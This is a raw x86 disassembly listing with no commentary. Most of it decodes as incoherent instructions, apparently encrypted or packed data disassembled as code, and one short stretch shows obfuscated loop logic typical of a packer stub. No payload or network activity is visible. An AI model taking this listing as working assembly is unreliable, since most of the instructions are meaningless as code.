  40bcbe:	xor    dh,0x3d
  40bcc1:	jo     0x40bc5e
  40bcc3:	addr16 adc eax,0x969e3143
  40bcc9:	mov    ah,BYTE PTR [eax-0x6e642f53]
  40bccf:	loop   0x40bc9a
  40bcd1:	adc    al,0xdf
  40bcd3:	mov    ebx,0x4c671ad3
  40bcd8:	xor    DWORD PTR [ebx+eiz*4-0x18b7164],ebx
  40bcdf:	xchg   DWORD PTR [edi-0x5f],eax
  40bce2:	pop    ebx
  40bce3:	mov    eax,ds:0x150d2c5d
  40bce8:	mov    al,0x6e
  40bcea:	loopne 0x40bc71
  40bcec:	int    0xb9
  40bcee:	popa   
  40bcef:	test   eax,0x6adcc0fd
  40bcf4:	xchg   ecx,eax
  40bcf5:	xchg   ebp,eax
  40bcf6:	and    eax,0xdf9fdf16
  40bcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcfc:	imul   esp,DWORD PTR [ecx+0xa],0xd785b3bb
  40bd03:	ins    BYTE PTR es:[edi],dx
  40bd04:	push   ecx
  40bd05:	jo     0x40bce7
  40bd07:	call   DWORD PTR [esi-0x738eb19c]
  40bd0d:	jo     0x40bd84
  40bd0f:	and    ch,bl
  40bd11:	outs   dx,BYTE PTR ds:[esi]
  40bd12:	sub    DWORD PTR [edi+esi*4-0x70d78a5a],edi
  40bd19:	mov    al,ds:0x9a81f6a9
  40bd1e:	sub    ebx,DWORD PTR [ebx-0x69]
  40bd21:	mov    dl,0xb4
  40bd23:	outs   dx,BYTE PTR ds:[esi]
  40bd24:	jbe    0x40bcab
  40bd26:	mov    bl,0xdc
  40bd28:	and    DWORD PTR [esi-0x3],edx
  40bd2b:	mov    DWORD PTR [eax+ebp*4],ebp
  40bd2e:	sbb    dl,BYTE PTR [ebx]
  40bd30:	and    eax,0x65019df5
  40bd35:	jecxz  0x40bd6f
  40bd37:	pusha  
  40bd38:	neg    DWORD PTR [edx]
  40bd3a:	in     eax,0xef
  40bd3c:	aam    0x54
  40bd3e:	and    al,0x79
  40bd40:	pop    edx
  40bd41:	out    0xca,al
  40bd43:	mul    BYTE PTR [edi+0xe]
  40bd46:	add    eax,0xee3301db
  40bd4b:	sbb    al,0xf5
  40bd4d:	pop    esi
  40bd4e:	cmp    bh,0x36
  40bd51:	pop    ds
  40bd52:	add    eax,0x95732acc
  40bd57:	sahf   
  40bd58:	adc    eax,0x193b088d
  40bd5d:	clc    
  40bd5e:	push   ss
  40bd5f:	fnstenv ds:0xf5843660
  40bd65:	adc    ebp,DWORD PTR [ebp-0x23407493]
  40bd6b:	stos   DWORD PTR es:[edi],eax
  40bd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd6d:	in     al,0x2f
  40bd6f:	xchg   DWORD PTR [ebp+0x11],esp
  40bd72:	shr    DWORD PTR [ebp-0x74],1
  40bd75:	mov    al,ds:0xf240b2a6
  40bd7a:	push   0xffffff94
  40bd7c:	daa    
  40bd7d:	xchg   ecx,eax
  40bd7e:	mov    bl,0x62
  40bd80:	ins    BYTE PTR es:[edi],dx
  40bd81:	das    
  40bd82:	clc    
  40bd83:	aaa    
  40bd84:	out    dx,al
  40bd85:	mov    DWORD PTR [esi-0x36],edx
  40bd88:	push   esi
  40bd89:	das    
  40bd8a:	jbe    0x40bd70
  40bd8c:	add    bl,BYTE PTR [ecx+eiz*1]
  40bd8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd90:	fld    st(5)
  40bd92:	push   esp
  40bd93:	push   0x2c52f087
  40bd98:	retf   
  40bd99:	fdiv   QWORD PTR [ecx+edi*1-0x33a0400]
  40bda0:	xchg   ecx,eax
  40bda1:	hlt    
  40bda2:	outs   dx,BYTE PTR ds:[esi]
  40bda3:	stos   BYTE PTR es:[edi],al
  40bda4:	adc    ebx,DWORD PTR [eax]
  40bda6:	rol    dh,cl
  40bda8:	out    dx,eax
  40bda9:	mov    es,WORD PTR [esi-0x2634b300]
  40bdaf:	or     BYTE PTR [ebp+0x6ce5c27c],ah
  40bdb5:	pusha  
  40bdb6:	dec    esp
  40bdb7:	not    BYTE PTR [edx+0x6c]
  40bdba:	mov    ds:0xc500cec1,eax
  40bdbf:	xchg   DWORD PTR [ecx+0x1b26bdc],ecx
  40bdc5:	and    BYTE PTR [edi],0xd3
  40bdc8:	pop    ds
  40bdc9:	inc    esi
  40bdca:	repnz fsubp st(3),st
  40bdcd:	call   0x1df2:0x4dc7da87
  40bdd4:	and    al,0xd9
  40bdd6:	mov    edx,0x39eedf7a
  40bddb:	shl    BYTE PTR [esi],1
  40bddd:	dec    eax
  40bdde:	or     ah,0xe5
  40bde1:	test   al,0x3
  40bde3:	aad    0x57
  40bde5:	mov    BYTE PTR [edi+0x63732818],bh
  40bdeb:	lds    ebp,FWORD PTR [ebp-0x7211865a]
  40bdf1:	cld    
  40bdf2:	sub    DWORD PTR [ebp-0x5a0f7660],ecx
  40bdf8:	cmp    eax,0xcd344152
  40bdfd:	and    al,0x65
  40bdff:	add    al,0xd2
  40be01:	pop    edi
  40be02:	jns    0x40bdaa
  40be04:	fwait
  40be05:	(bad)  
  40be06:	out    dx,al
  40be07:	mov    ch,0x50
  40be09:	add    DWORD PTR [edi+0x72],eax
  40be0c:	cld    
  40be0d:	inc    esp
  40be0e:	push   ebx
  40be0f:	cwde   
  40be10:	adc    eax,0x82ea8318
  40be15:	pop    ss
  40be16:	cmp    al,0x7d
  40be18:	dec    ebx
  40be19:	dec    ecx
  40be1a:	mov    edx,0x8e1cd483
  40be1f:	(bad)  
  40be20:	(bad)
  40be23:	lods   eax,DWORD PTR ds:[esi]
  40be24:	dec    ebp
  40be25:	mov    edi,0xbfef47d6
  40be2a:	and    cl,BYTE PTR [ecx+0xb]
  40be2d:	test   al,0x2e
  40be2f:	not    DWORD PTR [ebx]
  40be31:	int    0x3a
  40be33:	sbb    al,0x1c
  40be35:	sbb    eax,0x9cb7820c
  40be3a:	and    al,0xb0
  40be3c:	pusha  
  40be3d:	xchg   ebp,eax
  40be3e:	dec    ecx
  40be3f:	mov    edi,0x2d231a38
  40be44:	out    0x48,al
  40be46:	aam    0xde
  40be48:	ins    BYTE PTR es:[edi],dx
  40be49:	push   esp
  40be4a:	xchg   ebx,eax
  40be4b:	add    dh,dl
  40be4d:	xor    ch,dh
  40be4f:	lds    ebx,FWORD PTR [ebx+0x3df5de8d]
  40be55:	or     DWORD PTR [ebp-0x49],0xffffff88
  40be59:	xor    BYTE PTR [edi-0x55e56689],0xc4
  40be60:	pop    ecx
  40be61:	dec    esi
  40be62:	xchg   esi,eax
  40be63:	ins    BYTE PTR es:[edi],dx
  40be64:	imul   esp,DWORD PTR [ebp+0x459b6594],0x37
  40be6b:	lds    edx,FWORD PTR [edx]
  40be6d:	jnp    0x40bdf0
  40be6f:	and    BYTE PTR [ecx-0x7e],cl
  40be72:	(bad)  
  40be73:	retf   0xf638
  40be76:	ret    0x5356
  40be79:	push   edi
  40be7a:	scas   al,BYTE PTR es:[edi]
  40be7b:	jmp    0x40beb9
  40be7d:	mov    WORD PTR fs:[ecx],fs
  40be80:	or     cl,0x2d
  40be83:	jmp    0xa5d1:0xd8c35f2d
  40be8a:	imul   BYTE PTR [ecx-0x2a]
  40be8d:	mov    ecx,0x20bdbace
  40be92:	mov    ecx,0xd90f788d
  40be97:	sbb    ebp,esp
  40be99:	ret    0x3e08
  40be9c:	xchg   DWORD PTR [edx],eax
  40be9e:	dec    ebp
  40be9f:	aas    
  40bea0:	add    dh,al
  40bea2:	pushf  
  40bea3:	xor    ah,BYTE PTR [esi+0x4a7e0ea8]
  40bea9:	enter  0xb8d6,0x68
  40bead:	imul   edi,DWORD PTR [edx],0x87d8be1
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	call   0x7ae9:0xd419eb6e
  40c019:	jp     0x40c034
  40c01b:	pop    edi
  40c01c:	jp     0x40c098
  40c01e:	add    BYTE PTR [ecx+0x3f5ab726],cl
  40c024:	mov    edi,0xf3dd113
  40c029:	pop    ebp
  40c02a:	jecxz  0x40c08d
  40c02c:	push   ebx
  40c02d:	xchg   edx,eax
  40c02e:	ret    0xff03
  40c031:	adc    bh,BYTE PTR [eax-0x73]
  40c034:	loopne 0x40c01a
  40c036:	loopne 0x40c02a
  40c038:	lds    eax,FWORD PTR [esi-0x35]
  40c03b:	addr16 clc 
  40c03d:	jne    0x40c01b
  40c03f:	icebp  
  40c040:	pop    edi
  40c041:	sub    BYTE PTR [ecx+0x1b],bl
  40c044:	jge    0x40c010
  40c046:	adc    ebp,DWORD PTR [ebx-0x4f42a729]
  40c04c:	das    
  40c04d:	sub    dl,BYTE PTR [edx+esi*1-0x1a]
  40c051:	dec    DWORD PTR [ebp-0x602bff7a]
  40c057:	nop
  40c058:	mov    edx,0xd1443fbc
  40c05d:	mov    dh,0x67
  40c05f:	xor    DWORD PTR [edx],ebp
  40c061:	imul   DWORD PTR [edx+0x360cbfc5]
  40c067:	out    0xa1,eax
  40c069:	mov    ecx,0x784cde41
  40c06e:	push   es
  40c06f:	push   ss
  40c070:	jnp    0x40c09e
  40c072:	sbb    bh,BYTE PTR [ebx+0x47c32423]
  40c078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c079:	xchg   ecx,eax
  40c07a:	fucom  st(2)
  40c07c:	bound  eax,QWORD PTR [edx+ebp*2-0x53]
  40c080:	test   al,0xc7
  40c082:	sub    esi,esp
  40c084:	icebp  
  40c085:	or     edx,ebp
  40c087:	hlt    
  40c088:	or     al,0xeb
  40c08a:	push   ss
  40c08b:	cmp    ah,bh
  40c08d:	xor    dh,BYTE PTR [esi]
  40c08f:	inc    edx
  40c090:	retf   0x1700
  40c093:	sub    BYTE PTR [esi],cl
  40c095:	jmp    0x40c0f5
  40c097:	out    0xb2,al
  40c099:	xor    eax,0x5c93f5d
  40c09e:	mov    ah,BYTE PTR [ebx]
  40c0a0:	xchg   edx,eax
  40c0a1:	mov    ecx,0x7d9a9758
  40c0a6:	sysenter 
  40c0a8:	mov    al,0xcb
  40c0aa:	cs (bad) 
  40c0ac:	scas   al,BYTE PTR es:[edi]
  40c0ad:	sub    esi,eax
  40c0af:	pop    edi
  40c0b0:	das    
  40c0b1:	or     eax,esp
  40c0b3:	adc    DWORD PTR [esi-0x73],esp
  40c0b6:	je     0x40c044
  40c0b8:	and    dl,dl
  40c0ba:	mov    WORD PTR [eax+eax*8-0x2ba74efa],fs
  40c0c1:	mov    ch,0x2a
  40c0c3:	mov    eax,0x6cb482cb
  40c0c8:	out    dx,eax
  40c0c9:	sub    BYTE PTR [edi],cl
  40c0cb:	mov    dl,0x94
  40c0cd:	div    cl
  40c0cf:	imul   ebx,DWORD PTR [ebp-0x44caea80],0x5f5cb7bb
  40c0d9:	dec    edi
  40c0da:	push   cs
  40c0db:	xor    BYTE PTR [ebp-0x7f],0x3f
  40c0df:	rol    BYTE PTR [esi],1
  40c0e1:	in     al,0x7
  40c0e3:	(bad)  
  40c0e4:	(bad)  
  40c0e5:	jle    0x40c0de
  40c0e7:	imul   esi,ebp,0x942568fa
  40c0ed:	dec    ebx
  40c0ee:	mov    DWORD PTR [esi-0x6e4520d9],edi
  40c0f4:	daa    
  40c0f5:	int    0xa4
  40c0f7:	mov    ?,WORD PTR [ebp-0x37eb0760]
  40c0fd:	jl     0x40c16f
  40c0ff:	ds adc eax,0x22b472f5
  40c105:	outs   dx,BYTE PTR ds:[si]
  40c107:	fnstsw WORD PTR [edi]
  40c109:	scas   eax,DWORD PTR es:[di]
  40c10b:	xchg   edx,eax
  40c10c:	enter  0xe6be,0xb3
  40c110:	leave  
  40c111:	jb     0x40c0e6
  40c113:	adc    eax,0x28f9384c
  40c118:	stos   DWORD PTR es:[edi],eax
  40c119:	retf   
  40c11a:	ja     0x40c0cf
  40c11c:	hlt    
  40c11d:	push   edi
  40c11e:	mov    ds:0xf2bbc826,al
  40c123:	arpl   WORD PTR [edx+0x71],bx
  40c126:	jl     0x40c175
  40c128:	xchg   esi,eax
  40c129:	push   esp
  40c12a:	mov    dl,0xb3
  40c12c:	pop    ebp
  40c12d:	xchg   esi,eax
  40c12e:	xchg   edi,eax
  40c12f:	jbe    0x40c111
  40c131:	cmp    ch,dh
  40c133:	cmp    DWORD PTR [edx+0x3f],eax
  40c136:	rcr    esp,1
  40c138:	lds    esp,FWORD PTR [edi+0x3176da10]
  40c13e:	sub    DWORD PTR [edi+esi*8-0x50d6c74b],ebx
  40c145:	sbb    BYTE PTR [eax+eiz*8],al
  40c148:	xchg   edx,eax
  40c149:	fst    st(6)
  40c14b:	fistp  DWORD PTR [eax]
  40c14d:	stc    
  40c14e:	or     cl,dh
  40c150:	dec    ecx
  40c151:	jle    0x40c0f4
  40c153:	push   ecx
  40c154:	pop    esp
  40c155:	pusha  
  40c156:	mov    esp,0x7656884d
  40c15c:	sub    ah,BYTE PTR [ebp-0x3e]
  40c15f:	cli    
  40c160:	retf   
  40c161:	sti    
  40c162:	and    DWORD PTR [esi+0x716d156f],edx
  40c168:	ret    0xb5
  40c16b:	into   
  40c16c:	cmp    ecx,DWORD PTR [esi+0x477c7b4]
  40c172:	hlt    
  40c173:	out    dx,eax
  40c174:	dec    ebp
  40c175:	repnz mov dl,0xee
  40c178:	cs addr16 add bh,ch
  40c17c:	pop    edi
  40c17d:	jae    0x40c1ae
  40c17f:	mov    DWORD PTR [esp+ecx*8-0x13846078],esp
  40c186:	jp     0x40c10e
  40c188:	neg    DWORD PTR [ebx]
  40c18a:	je     0x40c181
  40c18c:	bound  ebx,QWORD PTR [esi]
  40c18e:	push   ds
  40c18f:	std    
  40c190:	fstp   TBYTE PTR [edi]
  40c192:	xchg   edi,eax
  40c193:	in     eax,0x6f
  40c195:	mov    ch,0xe1
  40c197:	imul   BYTE PTR [edi]
  40c199:	mov    dl,0x5a
  40c19b:	mov    gs,WORD PTR [ebx+esi*2-0x48668535]
  40c1a2:	xchg   esi,eax
  40c1a3:	enter  0xdc91,0x37
  40c1a7:	mov    bh,0x5c
  40c1a9:	addr16 pop edi
  40c1ab:	shl    DWORD PTR [edx+ebx*2-0x12309496],cl
  40c1b2:	aam    0xc7
  40c1b4:	and    edx,eax
  40c1b6:	popa   
  40c1b7:	jmp    0xc2cb95b6
  40c1bc:	adc    DWORD PTR [ecx-0x26],0x5
  40c1c0:	aas    
  40c1c1:	mov    ebx,0x9c58c9ae
  40c1c6:	mov    edi,0xa524b296
  40c1cb:	aaa    
  40c1cc:	sahf   
  40c1cd:	add    dh,BYTE PTR [edx]
  40c1cf:	cmp    esi,DWORD PTR [ebx]
  40c1d1:	mov    esp,0x8d0b2b2
  40c1d6:	and    DWORD PTR cs:[esi-0x7e9bb765],eax
  40c1dd:	push   0xffffff86
  40c1df:	shr    DWORD PTR [ecx],0x3d
  40c1e2:	xchg   BYTE PTR [ebp-0x5fe49452],cl
  40c1e8:	inc    eax
  40c1e9:	mov    al,ds:0xcb2cf9a3
  40c1ee:	and    ah,BYTE PTR [edi]
  40c1f0:	repz dec esp
  40c1f2:	jns    0x40c256
  40c1f4:	push   ds
  40c1f5:	sbb    esi,DWORD PTR [esp+ebp*1]
  40c1f8:	or     ebx,DWORD PTR [ecx]
  40c1fa:	inc    esi
  40c1fb:	fist   WORD PTR ds:0x31f88d16
  40c201:	jecxz  0x40c215
  40c203:	jmp    0x40c190
  40c205:	in     al,dx
  40c206:	sbb    eax,DWORD PTR [eax+0x232f5dcf]
  40c20c:	push   ecx
  40c20d:	repnz xor BYTE PTR [ebx],dh
  40c210:	adc    al,0x6b
  40c212:	out    dx,eax
  40c213:	inc    edx
  40c214:	pop    eax
  40c215:	xchg   esp,ecx
  40c217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c218:	ficom  DWORD PTR [edx+0x23]
  40c21b:	jl     0x40c1a1
  40c21d:	popa   
  40c21e:	daa    
  40c21f:	sbb    BYTE PTR [esi+ebx*1],al
  40c222:	stc    
  40c223:	push   esi
  40c224:	fdiv   QWORD PTR [ecx-0x27]
  40c227:	ins    DWORD PTR es:[edi],dx
  40c228:	fisubr DWORD PTR [ecx-0x20c6c62d]
  40c22e:	or     eax,0xee6de94c
  40c233:	sar    DWORD PTR [ebp+0x31],cl
  40c236:	fsub   QWORD PTR [edx-0x3d]
  40c239:	dec    edi
  40c23a:	sub    eax,0x382e7c4d
  40c23f:	dec    edi
  40c240:	mov    ebp,0xbff39181
  40c245:	scas   eax,DWORD PTR es:[edi]
  40c246:	lock pop ecx
  40c248:	das    
  40c249:	inc    eax
  40c24a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c24b:	mov    gs,eax
  40c24d:	ret    0xed42
  40c250:	mov    edi,DWORD PTR [eax+0x59]
  40c253:	mov    bl,0x86
  40c255:	fidiv  WORD PTR [edi-0x7d]
  40c258:	inc    eax
  40c259:	fnstenv [ebp-0x4f]
  40c25c:	cs fstp st(5)
  40c25f:	inc    ebp
  40c260:	lds    ecx,FWORD PTR [ebp-0x13]
  40c263:	lods   eax,DWORD PTR ds:[esi]
  40c264:	adc    BYTE PTR [ebp+esi*1-0x33],cl
  40c268:	in     eax,dx
  40c269:	lods   al,BYTE PTR ds:[esi]
  40c26a:	call   0xa43c8486
  40c26f:	push   ebp
  40c270:	jmp    0xb672:0x40b952bb
  40c277:	ins    BYTE PTR es:[edi],dx
  40c278:	dec    ebp
  40c279:	fndisi(8087 only) 
  40c27b:	cmp    al,0xda
  40c27d:	test   DWORD PTR [edi+0x1a],eax
  40c280:	cmp    al,0x96
  40c282:	popf   
  40c283:	fwait
  40c284:	arpl   WORD PTR [esi+0x5fc5b969],cx
  40c28a:	nop
  40c28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28c:	das    
  40c28d:	sbb    esp,DWORD PTR [ebp+0x6f]
  40c290:	pop    ebx
  40c291:	dec    esp
  40c292:	inc    edx
  40c293:	mov    WORD PTR [ebx],ss
  40c295:	jmp    0x309c:0xdd1bcec
  40c29c:	push   esp
  40c29d:	sub    al,0x13
  40c29f:	jmp    0x40c300
  40c2a1:	and    esi,DWORD PTR [eax]
  40c2a3:	mov    bh,0xa4
  40c2a5:	and    al,0x50
  40c2a7:	jo     0x40c272
  40c2a9:	and    al,0xf5
  40c2ab:	mov    bh,BYTE PTR [di-0x17]
  40c2af:	xor    al,0x1
  40c2b1:	xchg   ebx,eax
  40c2b2:	xor    bh,BYTE PTR [esp+ebx*1+0x67]
  40c2b6:	adc    ebp,DWORD PTR [ebx+edi*1-0x61023c14]
  40c2bd:	mov    ch,0x47
  40c2bf:	cli    
  40c2c0:	pop    es
  40c2c1:	shl    DWORD PTR [ebp+ebp*2+0x7b],1
  40c2c5:	sub    esi,ebx
  40c2c7:	push   ecx
  40c2c8:	jge    0x40c334
  40c2ca:	sbb    ebx,DWORD PTR ds:0x9a48ecaa
  40c2d0:	repz adc ebx,DWORD PTR [esi-0x75]
  40c2d4:	stc    
  40c2d5:	and    al,0x9e
  40c2d7:	jo     0x40c30e
  40c2d9:	in     al,0x8f
  40c2db:	mov    ds:0x92792994,al
  40c2e0:	loop   0x40c26d
  40c2e2:	cmp    eax,ebp
  40c2e4:	cmp    esi,DWORD PTR [ecx+0x21]
  40c2e7:	in     al,0x4c
  40c2e9:	mov    cl,0x68
  40c2eb:	fsub   st(0),st
  40c2ed:	fistp  QWORD PTR [edx]
  40c2ef:	ins    DWORD PTR es:[edi],dx
  40c2f0:	js     0x40c350
  40c2f2:	add    BYTE PTR [ebx-0x3],bh
  40c2f5:	mov    al,0x3b
  40c2f7:	dec    esp
  40c2f8:	call   0x7c9981f0
  40c2fd:	mov    edi,0xb0425c8e
  40c302:	jg     0x40c350
  40c304:	scas   eax,DWORD PTR es:[edi]
  40c305:	jmp    0x40c2a0
  40c307:	sti    
  40c308:	das    
  40c309:	xor    BYTE PTR [ebx+0x11f21eb],0xda
  40c310:	mov    edi,ebp
  40c312:	int    0x8b
  40c314:	mov    al,BYTE PTR [esi-0x6]
  40c317:	push   ds
  40c318:	scas   al,BYTE PTR es:[edi]
  40c319:	fsubrp st(2),st
  40c31b:	sbb    edi,DWORD PTR [edi-0x3f]
  40c31e:	mov    ebp,0xfe3c32e0
  40c323:	int    0xd6
  40c325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c326:	stos   BYTE PTR es:[edi],al
  40c327:	ja     0x40c36f
  40c329:	mov    BYTE PTR [ecx+0x11],ah
  40c32c:	mov    ds:0xc94e8ee7,eax
  40c331:	retf   
  40c332:	cmc    
  40c333:	(bad)  
  40c334:	jmp    0x450d:0x1f630b49
  40c33b:	stos   BYTE PTR es:[edi],al
  40c33c:	mov    ds:0x4eed0759,eax
  40c341:	xor    al,0x91
  40c343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c344:	jb     0x40c31d
  40c346:	das    
  40c347:	ror    DWORD PTR [edi+0x7851d66],1
  40c34d:	dec    ebp
  40c34e:	jae    0x40c2d8
  40c350:	cdq    
  40c351:	mov    edx,0xe98f0cc8
  40c356:	dec    ebp
  40c357:	das    
  40c358:	call   DWORD PTR [ebx]
  40c35a:	sbb    al,0x2b
  40c35c:	inc    edx
  40c35d:	inc    esp
  40c35e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c35f:	mov    al,ds:0x8d291b30
  40c364:	icebp  
  40c365:	xchg   DWORD PTR [edi-0x6d4d9f1e],esp
  40c36b:	and    esp,ecx
  40c36d:	dec    edi
  40c36e:	mov    esp,0x2d7c493e
  40c373:	hlt    
  40c374:	xchg   edx,eax
  40c375:	in     al,dx
  40c376:	mov    esp,DWORD PTR [eax-0x78]
  40c379:	out    dx,al
  40c37a:	repz rcr DWORD PTR [edx],cl
  40c37d:	xor    eax,0x4fa61bca
  40c382:	jle    0x40c351
  40c384:	and    DWORD PTR [ecx+0x27d9c],ebp
  40c38a:	out    0xb0,eax
  40c38c:	xor    al,0x17
  40c38e:	push   0xffffff8e
  40c390:	mov    ebx,DWORD PTR [ebx+0x26ed691]
  40c396:	in     al,dx
  40c397:	fdiv   st,st(1)
  40c399:	outs   dx,DWORD PTR ds:[esi]
  40c39a:	jae    0x40c3f0
  40c39c:	test   eax,0x9a9b10d8
  40c3a1:	jmp    0x295b2ed6
  40c3a6:	xchg   edx,eax
  40c3a7:	xor    DWORD PTR [edi-0x15],esi
  40c3aa:	xor    eax,0x2b05497d
  40c3af:	xor    BYTE PTR [edx-0x46e44ae7],0xf4
  40c3b6:	scas   al,BYTE PTR es:[edi]
  40c3b7:	loopne 0x40c3c3
  40c3b9:	js     0x40c401
  40c3bb:	ret    
  40c3bc:	lock cmp eax,0x79dd10f1
  40c3c2:	xchg   ebx,eax
  40c3c3:	iret   
  40c3c4:	push   ebx
  40c3c5:	xchg   BYTE PTR [ecx-0x7f6c4fd2],al
  40c3cb:	xchg   BYTE PTR [ebx],dl
  40c3cd:	adc    al,0xe8
  40c3cf:	xor    BYTE PTR [esi],ah
  40c3d1:	mov    bh,0x6d
  40c3d3:	jmp    0x82a7:0xfe4831c2
  40c3da:	xor    dh,cl
  40c3dc:	in     eax,0x53
  40c3de:	jne    0x40c454
  40c3e0:	xor    DWORD PTR ds:[edx],esi
  40c3e3:	mov    al,ds:0xb8ba7983
  40c3e8:	dec    esp
  40c3e9:	cmp    BYTE PTR [esi+0x6f17d4c6],bl
  40c3ef:	xor    DWORD PTR [ecx-0x4c0671a7],ebx
  40c3f5:	jno    0x40c3f1
  40c3f7:	jg     0x40c3db
  40c3f9:	bound  esi,QWORD PTR [ebp+0x77]
  40c3fc:	shl    BYTE PTR [edi],0xc4
  40c3ff:	ins    DWORD PTR es:[edi],dx
  40c400:	pop    ebx
  40c401:	in     al,0xa2
  40c403:	loope  0x40c459
  40c405:	in     al,0x28
  40c407:	in     eax,0x5
  40c409:	mov    ds:0x7ab24fc4,eax
  40c40e:	cmp    BYTE PTR [edx+0x62],ch
  40c411:	mov    eax,ds:0x44ea78f3
  40c416:	mov    ecx,0x8b7d0782
  40c41b:	or     dh,BYTE PTR [edx+eiz*2+0x65]
  40c41f:	in     eax,0x71
  40c421:	nop
  40c422:	call   0x3078b3a1
  40c427:	xor    BYTE PTR [edx+0x25639a1d],0x6
  40c42e:	mov    BYTE PTR [esi],al
  40c430:	mov    ebx,0x75a01a71
  40c435:	ins    DWORD PTR es:[edi],dx
  40c436:	add    BYTE PTR [ebx+0xd2eee3a],0xb8
  40c43d:	les    esi,FWORD PTR [ebx-0x7744076e]
  40c443:	jmp    0x4ff8:0x16ecce90
  40c44a:	pusha  
  40c44b:	push   eax
  40c44c:	mov    eax,ds:0x7da36778
  40c451:	fnstenv [edx-0xf]
  40c454:	call   0xc494689e
  40c459:	lods   al,BYTE PTR ds:[esi]
  40c45a:	xor    ebp,DWORD PTR [esi-0x303bc464]
  40c460:	sub    BYTE PTR [ebx],cl
  40c462:	jp     0x40c43a
  40c464:	dec    ebx
  40c465:	xlat   BYTE PTR ds:[ebx]
  40c466:	outs   dx,BYTE PTR ds:[esi]
  40c467:	rol    DWORD PTR [ebx],cl
  40c469:	ret    
  40c46a:	loopne 0x40c42a
  40c46c:	lock aam 0x52
  40c46f:	mov    eax,0xb82fca63
  40c474:	(bad)  
  40c475:	test   eax,0x3e97e229
  40c47a:	push   esp
  40c47b:	adc    ebx,DWORD PTR [esi-0x754af118]
  40c481:	add    al,0xae
  40c483:	(bad)  
  40c484:	out    dx,al
  40c485:	in     al,0x60
  40c487:	imul   ebp,DWORD PTR [edx],0xbd41c23e
  40c48d:	and    dl,BYTE PTR [ebx-0x3e2ab3b2]
  40c493:	stos   DWORD PTR es:[edi],eax
  40c494:	inc    ebp
  40c495:	mov    eax,0x135247e1
  40c49a:	fcomp  QWORD PTR [edx+0x65]
  40c49d:	mov    dl,0xff
  40c49f:	stos   BYTE PTR es:[edi],al
  40c4a0:	leave  
  40c4a1:	jmp    0x8840c217
  40c4a6:	push   ds
  40c4a7:	in     eax,0x64
  40c4a9:	and    esi,esp
  40c4ab:	fwait
  40c4ac:	push   0xffffffbc
  40c4ae:	lods   eax,DWORD PTR ds:[esi]
  40c4af:	jns    0x40c4c4
  40c4b1:	cmp    eax,0xb27c1216
  40c4b6:	mov    edi,0x7a549ec2
  40c4bb:	repz ds in al,0x84
  40c4bf:	jo     0x40c47c
  40c4c1:	aad    0xca
  40c4c3:	mov    ch,0xa8
  40c4c5:	es sahf 
  40c4c7:	shl    DWORD PTR [edx-0x30eaf4a1],1
